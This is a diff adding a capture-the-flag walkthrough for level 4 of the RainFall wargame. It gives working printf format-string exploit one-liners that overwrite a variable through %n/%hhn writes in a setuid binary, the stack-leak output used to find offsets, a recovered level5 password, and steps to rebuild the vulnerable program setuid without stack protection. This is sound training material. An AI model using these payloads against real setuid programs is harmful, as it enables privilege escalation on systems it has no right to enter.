@@ -3,3 +3,64 @@ level4@RainFall:/tmp$ cat banana | /home/user/level4/level4
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 
+
+// Alex version
+python -c "print('\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 56*'A' + '%12\$n' + 17*'A' + '%13\$n' + 173*'A' + '%14\$n')" | ~/level4
+
+
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
+
+# Similar to level3, we will provide a formatted string for printf to overwrite a variable.
+
+# This time, we need to overwrite the variable at address 0x08049810 with the value 0x1025544.
+
+# We can split up this large value into 3 small value writes sequentially:
+
+	Write the 1-byte value 0x44 ( 68 ) at address 0x08049810
+	Write the 1-byte value 0x55 ( 85 ) at address 0x08049811
+	Write the 2-byte value 0x0102 ( 258 ) at address 0x08049812
+
+# Format the string thus:
+	# Print the 3 addresses.  We have printed 12 bytes thus far.
+	# Print 56 bytes.  We have printed 68 bytes thus far.  Write 68 to %hhn at address 0x08049810.
+	# Print 17 bytes.  We have printed 85 bytes thus far.  Write 85 to %hhn at address 0x08049811.
+	# Print 173 bytes.  We have printed 258 bytes thus far.  Write 258 to %hhn at address 0x08049812.
+
+# We find the first 12 bytes of the buffer are in the 12$, 13$, 14$ args of printf.
+level4@RainFall:/tmp$ ~/level4
+AAAABBBBCCCC %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+AAAABBBBCCCC 0xb7ff26b0 0xbffff744 0xb7fd0ff4 (nil) (nil) 0xbffff708 0x804848d 0xbffff500 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x42424242 0x43434343 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+
+# Run the program.
+python -c "print('\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 'A' * 56 + '%12\$hhn' + 'A' * 17 + '%13\$hhn' + 'A' * 173 + '%14\$hn')" | ~/level4
+
+# Now we can log in as user level5
+su level5
+# password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user level5:
+
+    # Compile the program in /tmp
+    gcc source4.c -fno-stack-protector -o ft_level4
+
+    # Edit suid
+    chmod u+s ft_level4
+
+    # Move the exploit to home directory
+    chmod +wx ~; mv ft_level4 ~
+
+# As user level4:
+
+    # Run the program
+    python -c "print('\x08\x04\xa0\x28'[::-1] + '\x08\x04\xa0\x29'[::-1] + '\x08\x04\xa0\x2a'[::-1] + 'A' * 56 + '%12\$hhn' + 'A' * 17 + '%13\$hhn' + 'A' * 173 + '%14\$hn')" | /home/user/level5/ft_level4
+
+
+
